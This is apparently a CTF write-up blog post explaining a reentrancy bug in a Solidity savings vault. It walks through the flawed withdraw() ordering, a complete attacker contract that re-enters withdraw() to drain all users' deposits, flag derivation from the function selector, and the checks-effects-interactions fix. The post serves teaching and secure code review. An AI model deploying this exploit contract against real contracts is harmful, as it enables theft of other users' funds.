---
slug: "vault-reentrancy-checks-effects-interactions"
title: "The Vault That Ate Itself: reentrancy is still a thing"
date: "2026-10-08"
category: "ctf"
tags:
  - "CTF"
  - "Web3"
  - "Smart Contracts"
  - "Reentrancy"
  - "31 Nights of Cyber"
excerpt: "A shared savings vault lost every user's deposit in a single withdrawal. The cause was three lines in the wrong order, and the flag was the vulnerable function's selector."
---

![The Vault That Ate Itself — a CEI violation](/images/blog/vault-reentrancy-checks-effects-interactions/hero.png)

Reentrancy is the vulnerability everyone has heard of and nobody expects to see again. It is the "SQL injection" of smart contracts: famous, well documented, and still shipping.

The brief: a shared savings vault lost its entire balance during what logs show as a single withdrawal transaction, including funds belonging to users who never withdrew. We get the full source, no live instance. Identify the function responsible, confirm the exploit locally, and derive the flag from the vulnerable function's own signature.

## The three lines

```solidity
function withdraw() external {
    uint256 amount = balances[msg.sender];
    require(amount > 0, "nothing to withdraw");

    (bool success, ) = msg.sender.call{value: amount}("");
    require(success, "transfer failed");

    balances[msg.sender] = 0;
    emit Withdraw(msg.sender, amount);
}
```

Read the order:

1. **Check** — read `balances[msg.sender]`.
2. **Interaction** — send `amount` ETH to `msg.sender` via a low-level `call`, which forwards all remaining gas.
3. **Effect** — set `balances[msg.sender] = 0`.

The balance is still set while the external call is running. If `msg.sender` is a contract, its `receive()` function executes *inside* the `call`, and it can call `withdraw()` again. Each nested call sees the same non-zero balance and sends the same amount again.

That is the entirety of the bug. No integer overflow, no access control problem, no oracle manipulation. Just the wrong order of operations.

![The reentrant call path](/images/blog/vault-reentrancy-checks-effects-interactions/flow.png)

## The attack contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IVault {
    function deposit() external payable;
    function withdraw() external;
}

contract Exploit {
    IVault public vault;
    uint256 public calls;

    constructor(address _vault) {
        vault = IVault(_vault);
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        if (calls < 5) {
            calls++;
            vault.withdraw();   // re-enter before the vault zeroes our balance
        }
    }
}
```

The vault sends ETH to `Exploit`; `receive()` runs with `balances[Exploit]` still at its original value; it calls `withdraw()` again; the vault sends again. Five nested calls later, the attacker has been paid six times. The limit is arbitrary — the attacker stops when the vault runs out of ETH.

Because the vault holds *everyone's* deposits, the drain is not limited to the attacker's own stake. That is why the logs show a single transaction taking the whole balance.

## Confirming it locally

I did not need a live instance or a fork of mainnet. A local [Foundry](https://book.getfoundry.sh/) test is enough: deploy the vault, deposit from two accounts, deploy the exploit, call `attack()`, then assert that the vault balance is zero and the exploit balance is greater than its deposit.

The important assertion is not "the attacker got money". It is "**the second user's deposit is gone**". That is the impact statement you would write in a report.

## The decoy

`emergencyWithdrawAll()` looks like an admin backdoor:

```solidity
function emergencyWithdrawAll() external {
    require(tx.origin == owner, "not owner");
    payable(owner).transfer(address(this).balance);
}
```

It is a red herring. It requires `tx.origin == owner`, which an attacker contract cannot satisfy while also being the caller of `withdraw()` in the exploit path, and the source comment says it has no bearing on drainability. The loss comes from `withdraw()`.

Still, it is a genuinely bad function: `tx.origin` for authorisation is its own anti-pattern. If you are reviewing this contract for real, you would flag it separately, even though it is not the challenge answer.

## Deriving the flag

The brief asks for the flag derived from the vulnerable function's **own signature**. A function selector is the first four bytes of the Keccak-256 hash of the canonical signature:

```python
from keccak import keccak256

print(keccak256(b"withdraw()")[:4].hex())
# 3ccfd60b
```

For comparison, the other selectors:

```
deposit()                -> d0e30db0
emergencyWithdrawAll()   -> dd191719
withdraw()               -> 3ccfd60b   <-- vulnerable function
```

Lowercase hex, no `0x`:

```
r00t{3ccfd60b}
```

I like this flag format because it forces you to identify the *function*, not just reproduce a value from the source. It is the kind of question a code review should answer.

## The fix, in order

```solidity
function withdraw() external {
    uint256 amount = balances[msg.sender];
    require(amount > 0, "nothing to withdraw");

    balances[msg.sender] = 0;                 // effect first
    (bool success, ) = msg.sender.call{value: amount}("");
    require(success, "transfer failed");

    emit Withdraw(msg.sender, amount);
}
```

That is checks-effects-interactions. It closes this specific bug.

Defence in depth:

- Add a `nonReentrant` mutex from [OpenZeppelin's `ReentrancyGuard`](https://docs.openzeppelin.com/contracts/5.x/api/utils#ReentrancyGuard). It costs gas but it protects every function, including the ones you add later.
- Prefer a **pull-payment** pattern: `withdraw()` credits an internal balance, and users call a separate `claim()` to transfer funds. It removes the external call from the accounting path.
- Use `transfer`/`send`? No — those forward limited gas and can break legitimate contracts. The right answer is CEI plus a guard, not gas stipends.
- Consider [Solady's `ReentrancyGuardTransient`](https://github.com/Vectorized/solady/blob/main/src/utils/ReentrancyGuardTransient.sol) if gas matters and you are on a chain with EIP-1153 transient storage.

The broader lesson: **any external call is a reentrancy opportunity**, not just ETH transfers. ERC-20 callbacks, ERC-721 `onERC721Received`, ERC-777 hooks, and arbitrary `call`s all run attacker code before your state is final.

## Further reading

- [Solidity docs — reentrancy](https://docs.soliditylang.org/en/latest/security-considerations.html#re-entrancy)
- [OpenZeppelin ReentrancyGuard](https://docs.openzeppelin.com/contracts/5.x/api/utils#ReentrancyGuard)
- [SWC-107 — Reentrancy](https://swcregistry.io/docs/SWC-107)
- [Consensys — Ethereum smart contract security best practices](https://consensysdiligence.github.io/smart-contract-best-practices/attacks/reentrancy/)
- [The DAO exploit, explained](https://en.wikipedia.org/wiki/The_DAO) — the historical version of this exact bug

Next was a web app where one recursive merge crossed four trust boundaries.
